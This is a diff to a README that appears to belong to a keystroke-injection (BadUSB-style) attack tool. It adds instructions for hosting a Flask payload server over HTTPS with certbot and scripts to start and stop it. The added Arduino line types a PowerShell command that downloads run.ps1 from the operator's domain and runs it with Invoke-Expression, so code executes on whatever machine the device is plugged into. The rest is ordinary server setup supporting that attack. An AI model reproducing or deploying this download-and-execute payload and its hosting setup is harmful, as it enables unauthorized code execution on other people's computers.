@@ -84,6 +84,71 @@ Run app.py:
 ```bash
 python app.py
 ```
+## Extra Options
+1. Point your domain DNS to your remote server IP
+2. Get an ssl certificate from letsencrypt by utalizing [certbot](https://certbot.eff.org/)
+Install Certbot
+```bash
+sudo snap install --classic certbot
+```
+Prepare Certbot Command
+```bash
+sudo ln -s /snap/bin/certbot /usr/bin/certbot
+```
+Install the Cert
+```bash
+    sudo certbot certonly --standalone
+```
+3. Fill out the prompts with your domain information
+4. Add the following to `app.py`
+```python
+from flask import Flask, request, jsonify, send_from_directory
+import os
+import json
+import base64
+from datetime import datetime
+import pytz
+from flask_sslify import SSLify
+
+app = Flask(__name__, static_url_path='/uploads', static_folder='uploads')
+sslify = SSLify(app)
+
+# ... (Rest of your code remains the same)
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=443, ssl_context=('/etc/letsencrypt/live/{{your-domain}}/fullchain.pem', '/etc/letsencrypt/live/{{your-domain}}/privkey.pem'))
+
+```
+5. Update your arduino script to use the FQDN of your server
+```bash
+# ...
+
+Keyboard.print("$scriptUrl = 'https://{{your-domain}}/uploads/run.ps1'; Invoke-Expression -Command (Invoke-RestMethod -Uri $scriptUrl)");
+
+# ... (Rest of your code remains the same)
+```
+7. Setup a Start and Stop shell script and put them in the root directory
+Start.sh
+```bash
+#!/bin/bash
+
+nohup python app.py > /dev/null 2>&1 &
+
+echo "Flask app started with PID: $!"
+```
+Stop.sh
+```bash
+#!/bin/bash
+
+# Find and kill the Flask app process
+pid=$(pgrep -f "python app.py")
+if [ -n "$pid" ]; then
+  echo "Stopping Flask app (PID: $pid)..."
+  kill "$pid"
+  echo "Flask app stopped."
+else
+  echo "Flask app is not running."
+fi
+```
 
 
 ## Troubleshooting
